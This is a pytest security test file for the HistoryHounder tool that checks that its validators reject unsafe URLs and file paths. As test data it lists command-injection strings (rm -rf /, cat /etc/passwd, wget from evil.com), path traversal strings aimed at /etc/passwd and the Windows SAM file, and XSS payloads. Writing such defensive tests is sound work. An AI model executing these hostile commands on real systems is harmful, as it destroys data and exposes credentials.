import pytest
import tempfile
import os
from unittest.mock import patch, MagicMock
from historyhounder.content_fetcher import validate_url, fetch_youtube_metadata, fetch_article_content
from historyhounder.cli import validate_file_path
from historyhounder.history_extractor import secure_temp_db_copy


class TestURLValidation:
    """Test URL validation to prevent command injection."""
    
    def test_valid_urls(self):
        """Test that valid URLs pass validation."""
        valid_urls = [
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "http://example.com",
            "https://subdomain.example.com/path?param=value",
            "https://example.com:8080/path"
        ]
        
        for url in valid_urls:
            assert validate_url(url) is True, f"URL should be valid: {url}"
    
    def test_invalid_urls(self):
        """Test that invalid URLs fail validation."""
        invalid_urls = [
            None,
            "",
            "not-a-url",
            "ftp://example.com",  # Unsupported scheme
            "file:///etc/passwd",  # File scheme
            "javascript:alert('xss')",  # JavaScript scheme
        ]
        
        for url in invalid_urls:
            assert validate_url(url) is False, f"URL should be invalid: {url}"
    
    def test_command_injection_attempts(self):
        """Test that URLs with shell metacharacters are rejected."""
        malicious_urls = [
            "https://example.com; rm -rf /",
            "https://example.com && cat /etc/passwd",
            "https://example.com | wget http://evil.com/backdoor",
            "https://example.com`whoami`",
            "https://example.com$(id)",
            "https://example.com{ls,}",
            "https://example.com[$(id)]",
            "https://example.com<malicious>",
            "https://example.com\"malicious\"",
            "https://example.com'malicious'",
            "https://example.com\\malicious",
        ]
        
        for url in malicious_urls:
            assert validate_url(url) is False, f"Malicious URL should be rejected: {url}"
    
    def test_url_length_limits(self):
        """Test that extremely long URLs are handled properly."""
        # Create a very long URL
        long_url = "https://example.com/" + "a" * 10000
        
        # Should not crash and should return False for extremely long URLs
        result = validate_url(long_url)
        assert isinstance(result, bool)


class TestFilePathValidation:
    """Test file path validation to prevent path traversal."""
    
    def test_valid_file_paths(self):
        """Test that valid file paths pass validation."""
        with tempfile.NamedTemporaryFile() as tmp_file:
            assert validate_file_path(tmp_file.name) is True
    
    def test_invalid_file_paths(self):
        """Test that invalid file paths fail validation."""
        invalid_paths = [
            None,
            "",
            "/etc/passwd",  # Absolute path
            "../../../etc/passwd",  # Path traversal
            "C:\\Windows\\System32\\config\\SAM",  # Windows path with colon
            "/tmp/nonexistent_file.txt",  # Non-existent file
            "/tmp",  # Directory, not file
        ]
        
        for path in invalid_paths:
            assert validate_file_path(path) is False, f"Path should be invalid: {path}"
    
    def test_path_traversal_attempts(self):
        """Test that path traversal attempts are rejected."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
            "..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM",  # URL encoded Windows
        ]
        
        for path in traversal_paths:
            assert validate_file_path(path) is False, f"Path traversal should be rejected: {path}"


class TestSubprocessSecurity:
    """Test subprocess security to prevent command injection."""
    
    @patch('subprocess.run')
    def test_youtube_metadata_safe_url(self, mock_run):
        """Test that safe URLs are processed correctly."""
        mock_run.return_value.stdout = '{"title": "Test Video"}'
        mock_run.return_value.returncode = 0
        
        result = fetch_youtube_metadata("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        
        assert result['type'] == 'video'
        assert 'error' not in result
        mock_run.assert_called_once()
    
    def test_youtube_metadata_malicious_url(self):
        """Test that malicious URLs are rejected."""
        malicious_urls = [
            "https://example.com; rm -rf /",
            "https://example.com && cat /etc/passwd",
            "https://example.com | wget http://evil.com/backdoor",
        ]
        
        for url in malicious_urls:
            result = fetch_youtube_metadata(url)
            assert result['type'] == 'video'
            assert 'error' in result
            assert 'Invalid or unsafe URL' in result['error']
    
    @patch('subprocess.run')
    def test_subprocess_timeout(self, mock_run):
        """Test that subprocess timeouts are handled correctly."""
        mock_run.side_effect = TimeoutError("Process timed out")
        
        result = fetch_youtube_metadata("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        
        assert result['type'] == 'video'
        assert 'error' in result
        assert 'timeout' in result['error'].lower()


class TestNetworkSecurity:
    """Test network security features."""
    
    @patch('requests.get')
    def test_article_content_user_agent(self, mock_get):
        """Test that User-Agent header is set correctly."""
        mock_response = MagicMock()
        mock_response.text = "<html><title>Test</title></html>"
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response
        
        fetch_article_content("https://example.com")
        
        # Check that User-Agent header was set
        call_args = mock_get.call_args
        assert 'headers' in call_args[1]
        assert 'User-Agent' in call_args[1]['headers']
        assert 'HistoryHounder' in call_args[1]['headers']['User-Agent']
    
    def test_article_content_malicious_url(self):
        """Test that malicious URLs are rejected for article content."""
        malicious_urls = [
            "https://example.com; rm -rf /",
            "https://example.com && cat /etc/passwd",
            "file:///etc/passwd",
        ]
        
        for url in malicious_urls:
            result = fetch_article_content(url)
            assert 'error' in result
            assert 'Invalid or unsafe URL' in result['error']


class TestTemporaryFileSecurity:
    """Test temporary file security."""
    
    def test_secure_temp_db_copy_cleanup(self):
        """Test that temporary files are properly cleaned up."""
        with tempfile.NamedTemporaryFile() as tmp_file:
            tmp_file.write(b"test data")
            tmp_file.flush()
            
            with secure_temp_db_copy(tmp_file.name) as temp_path:
                # Verify temporary file was created
                assert os.path.exists(temp_path)
                # Verify it's a file, not a directory
                assert os.path.isfile(temp_path)
                # Verify permissions are restrictive
                stat = os.stat(temp_path)
                assert stat.st_mode & 0o777 == 0o600
            
            # Verify temporary file was cleaned up
            assert not os.path.exists(temp_path)
    
    def test_secure_temp_db_copy_exception_handling(self):
        """Test that temporary files are cleaned up even if exceptions occur."""
        with tempfile.NamedTemporaryFile() as tmp_file:
            tmp_file.write(b"test data")
            tmp_file.flush()
            
            temp_path = None
            try:
                with secure_temp_db_copy(tmp_file.name) as temp_path:
                    assert os.path.exists(temp_path)
                    raise Exception("Test exception")
            except Exception:
                pass
            
            # Verify temporary file was cleaned up even after exception
            if temp_path:
                assert not os.path.exists(temp_path)


class TestInputValidation:
    """Test input validation across the application."""
    
    def test_parse_comma_separated_values_security(self):
        """Test that comma-separated value parsing is secure."""
        from historyhounder.utils import parse_comma_separated_values
        
        # Test with normal input
        result = parse_comma_separated_values("domain1.com,domain2.com")
        assert result == ["domain1.com", "domain2.com"]
        
        # Test with empty input
        result = parse_comma_separated_values("")
        assert result == []
        
        # Test with None input
        result = parse_comma_separated_values(None)
        assert result == []
        
        # Test with malicious input (should be handled gracefully)
        result = parse_comma_separated_values("domain1.com; rm -rf /,domain2.com")
        assert "domain1.com; rm -rf /" in result  # This is expected behavior for now
    
    def test_should_ignore_security(self):
        """Test that URL filtering is secure."""
        from historyhounder.utils import should_ignore
        
        # Test with normal URLs
        assert should_ignore("https://google.com", ["google.com"], []) is True
        assert should_ignore("https://example.com", ["google.com"], []) is False
        
        # Test with malicious URLs (should not crash)
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
        ]
        
        for url in malicious_urls:
            # Should not crash and should return a boolean
            result = should_ignore(url, [], [])
            assert isinstance(result, bool)


class TestErrorHandling:
    """Test error handling to prevent information disclosure."""
    
    def test_error_messages_no_sensitive_info(self):
        """Test that error messages don't contain sensitive information."""
        # Test URL validation error
        result = fetch_youtube_metadata("https://example.com; rm -rf /")
        assert "Invalid or unsafe URL" in result['error']
        assert "rm -rf" not in result['error']  # Should not expose the malicious part
        
        # Test file path validation error
        result = validate_file_path("/etc/passwd")
        assert result is False  # Should not expose file contents or system info


if __name__ == "__main__":
    pytest.main([__file__]) 